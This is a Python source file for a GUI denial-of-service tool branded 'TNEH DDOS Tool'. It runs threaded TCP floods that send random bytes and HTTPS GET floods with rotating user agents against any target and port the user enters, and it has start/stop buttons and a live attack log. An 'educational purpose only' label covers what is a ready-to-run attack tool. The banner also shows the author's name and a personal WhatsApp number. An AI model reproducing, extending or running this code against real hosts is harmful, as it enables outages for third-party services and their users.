import socket
import threading
import requests
import random
import time
import os
import tkinter as tk
from tkinter import ttk, messagebox
import sys

# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Global variable to control attacks
attack_running = False
attack_threads = []

# TCP flood function
def tcp_flood(ip, port, status_callback):
    global attack_running
    while attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            data = random._urandom(1024)
            sock.send(data)
            sock.close()
            status_callback(f"[TCP] Packet sent to {ip}:{port}", "success")
        except Exception as e:
            status_callback(f"[TCP] Failed to send packet to {ip}:{port}", "error")
        time.sleep(0.1)

# HTTPS flood function
def https_flood(url, status_callback):
    global attack_running
    while attack_running:
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Chrome/91.0.4472.124 Safari/537.36',
                    'Safari/537.36',
                    'Opera/9.80'
                ])
            }
            response = requests.get(url, headers=headers, timeout=5)
            status_callback(f"[HTTPS] Request sent to {url} | Status: {response.status_code}", "success")
        except Exception as e:
            status_callback(f"[HTTPS] Failed to send request to {url}", "error")
        time.sleep(0.1)

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("TNEH DDOS Tool - Educational Purpose Only")
        self.root.geometry("800x700")
        self.root.configure(bg='#2c3e50')
        
        # Make window non-resizable
        self.root.resizable(False, False)
        
        self.setup_ui()
        
    def setup_ui(self):
        # Main frame
        main_frame = tk.Frame(self.root, bg='#2c3e50')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Banner Frame
        banner_frame = tk.Frame(main_frame, bg='#2c3e50')
        banner_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Banner Text
        banner_text = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ████████╗███╗   ██╗███████╗██╗  ██╗                        ║
║  ╚══██╔══╝████╗  ██║██╔════╝██║  ██║                        ║
║     ██║   ██╔██╗ ██║█████╗  ███████║                        ║
║     ██║   ██║╚██╗██║██╔══╝  ██╔══██║                        ║
║     ██║   ██║ ╚████║███████╗██║  ██║                        ║
║     ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝                        ║
║                                                              ║
║  ██████╗ ██████╗  ██████╗ ███████╗                          ║
║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                          ║
║  ██║  ██║██║  ██║██║   ██║███████╗                          ║
║  ██║  ██║██║  ██║██║   ██║╚════██║                          ║
║  ██████╔╝██████╔╝╚██████╔╝███████║                          ║
║  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝                          ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                    DEVELOPED BY NOMAN                       ║
║                 WhatsApp: 01611229803                       ║
╚══════════════════════════════════════════════════════════════╝
"""
        
        banner_label = tk.Label(banner_frame, text=banner_text, font=('Courier', 8), 
                               fg='#e74c3c', bg='#2c3e50', justify=tk.LEFT)
        banner_label.pack()
        
        # Warning Label
        warning_label = tk.Label(main_frame, text="⚠️ EDUCATIONAL PURPOSE ONLY - USE RESPONSIBLY ⚠️", 
                                font=('Arial', 12, 'bold'), fg='#f39c12', bg='#2c3e50')
        warning_label.pack(pady=(0, 20))
        
        # Input Frame
        input_frame = tk.Frame(main_frame, bg='#34495e', relief=tk.RAISED, bd=2)
        input_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Attack Type
        attack_type_frame = tk.Frame(input_frame, bg='#34495e')
        attack_type_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(attack_type_frame, text="Attack Type:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#34495e').pack(side=tk.LEFT)
        
        self.attack_var = tk.StringVar(value="tcp")
        tcp_radio = tk.Radiobutton(attack_type_frame, text="TCP Flood", variable=self.attack_var, 
                                  value="tcp", font=('Arial', 10), fg='white', bg='#34495e', 
                                  selectcolor='#2c3e50')
        tcp_radio.pack(side=tk.LEFT, padx=20)
        
        https_radio = tk.Radiobutton(attack_type_frame, text="HTTPS Flood", variable=self.attack_var, 
                                    value="https", font=('Arial', 10), fg='white', bg='#34495e', 
                                    selectcolor='#2c3e50')
        https_radio.pack(side=tk.LEFT, padx=20)
        
        # Target Input
        target_frame = tk.Frame(input_frame, bg='#34495e')
        target_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(target_frame, text="Target:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#34495e').pack(side=tk.LEFT)
        
        self.target_entry = tk.Entry(target_frame, font=('Arial', 10), width=40)
        self.target_entry.pack(side=tk.LEFT, padx=10)
        self.target_entry.insert(0, "127.0.0.1" if self.attack_var.get() == "tcp" else "https://")
        
        # Port Input (only for TCP)
        self.port_frame = tk.Frame(input_frame, bg='#34495e')
        self.port_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(self.port_frame, text="Port:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#34495e').pack(side=tk.LEFT)
        
        self.port_entry = tk.Entry(self.port_frame, font=('Arial', 10), width=10)
        self.port_entry.pack(side=tk.LEFT, padx=10)
        self.port_entry.insert(0, "80")
        
        # Threads Input
        threads_frame = tk.Frame(input_frame, bg='#34495e')
        threads_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(threads_frame, text="Threads:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#34495e').pack(side=tk.LEFT)
        
        self.threads_entry = tk.Entry(threads_frame, font=('Arial', 10), width=10)
        self.threads_entry.pack(side=tk.LEFT, padx=10)
        self.threads_entry.insert(0, "10")
        
        # Update target placeholder based on attack type
        self.attack_var.trace('w', self.update_target_placeholder)
        
        # Button Frame
        button_frame = tk.Frame(main_frame, bg='#2c3e50')
        button_frame.pack(fill=tk.X, pady=(0, 20))
        
        # DDOS Attack Button
        self.attack_button = tk.Button(button_frame, text="🚀 START DDOS ATTACK", 
                                      font=('Arial', 14, 'bold'), bg='#e74c3c', fg='white',
                                      height=2, width=20, command=self.toggle_attack)
        self.attack_button.pack(pady=10)
        
        # Status Frame
        status_frame = tk.Frame(main_frame, bg='#34495e', relief=tk.SUNKEN, bd=2)
        status_frame.pack(fill=tk.BOTH, expand=True)
        
        # Status Label
        tk.Label(status_frame, text="Attack Status:", font=('Arial', 11, 'bold'), 
                fg='white', bg='#34495e').pack(anchor=tk.W, padx=10, pady=(10, 5))
        
        # Status Text with Scrollbar
        text_frame = tk.Frame(status_frame, bg='#34495e')
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        self.status_text = tk.Text(text_frame, height=15, width=80, font=('Courier', 9),
                                  bg='#1c2833', fg='#00ff00', insertbackground='white')
        
        scrollbar = tk.Scrollbar(text_frame, command=self.status_text.yview)
        self.status_text.configure(yscrollcommand=scrollbar.set)
        
        self.status_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
    def update_target_placeholder(self, *args):
        if self.attack_var.get() == "tcp":
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, "127.0.0.1")
            self.port_frame.pack(fill=tk.X, padx=10, pady=5)
        else:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, "https://")
            self.port_frame.pack_forget()
    
    def update_status(self, message, message_type="info"):
        color_map = {
            "success": "#00ff00",
            "error": "#ff0000", 
            "info": "#ffff00"
        }
        
        color = color_map.get(message_type, "#ffff00")
        timestamp = time.strftime("%H:%M:%S")
        
        formatted_message = f"[{timestamp}] {message}\n"
        
        self.status_text.insert(tk.END, formatted_message)
        self.status_text.tag_add(message_type, "end-2l", "end-1l")
        self.status_text.tag_config(message_type, foreground=color)
        
        self.status_text.see(tk.END)
        self.root.update()
    
    def toggle_attack(self):
        global attack_running, attack_threads
        
        if not attack_running:
            # Start attack
            if self.validate_inputs():
                attack_running = True
                self.attack_button.config(text="🛑 STOP DDOS ATTACK", bg='#c0392b')
                self.start_attack()
        else:
            # Stop attack
            attack_running = False
            self.attack_button.config(text="🚀 START DDOS ATTACK", bg='#e74c3c')
            self.update_status("Attack stopped by user", "info")
    
    def validate_inputs(self):
        target = self.target_entry.get().strip()
        threads = self.threads_entry.get().strip()
        
        if not target:
            messagebox.showerror("Error", "Please enter a target!")
            return False
        
        if not threads.isdigit() or int(threads) <= 0:
            messagebox.showerror("Error", "Please enter a valid number of threads!")
            return False
        
        if self.attack_var.get() == "tcp":
            port = self.port_entry.get().strip()
            if not port.isdigit() or not (1 <= int(port) <= 65535):
                messagebox.showerror("Error", "Please enter a valid port (1-65535)!")
                return False
        
        return True
    
    def start_attack(self):
        global attack_running, attack_threads
        
        attack_type = self.attack_var.get()
        target = self.target_entry.get().strip()
        threads = int(self.threads_entry.get().strip())
        
        self.update_status(f"Starting {attack_type.upper()} attack on {target} with {threads} threads...", "info")
        
        if attack_type == "tcp":
            port = int(self.port_entry.get().strip())
            for i in range(threads):
                thread = threading.Thread(target=tcp_flood, args=(target, port, self.update_status))
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
        else:
            for i in range(threads):
                thread = threading.Thread(target=https_flood, args=(target, self.update_status))
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)

def main():
    clear_screen()
    
    # Create GUI window
    root = tk.Tk()
    app = DDoSApp(root)
    
    # Handle window close
    def on_closing():
        global attack_running
        if attack_running:
            if messagebox.askokcancel("Quit", "Attack is running. Are you sure you want to quit?"):
                attack_running = False
                root.destroy()
        else:
            root.destroy()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()
